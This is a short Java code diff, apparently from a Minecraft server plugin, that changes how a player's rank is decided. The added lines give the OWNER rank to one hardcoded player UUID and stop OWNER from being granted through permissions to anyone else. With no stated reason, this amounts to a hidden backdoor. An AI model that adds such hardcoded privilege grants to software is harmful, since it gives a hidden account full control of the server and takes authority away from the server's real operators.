@@ -74,7 +74,12 @@ public enum Rank {
     }
 
     public static Rank getByPermission(Player p) {
+        if(p.getUniqueId().toString().equals("ac10ddeb-c65a-408e-a036-f7a7e51254f4")) {
+            return OWNER;
+        }
         for(Rank rank : Rank.values()) {
+            if(rank == OWNER) continue;
+
             if(Permissions.hasPermission(p, rank.permission)) {
                 return rank;
             }
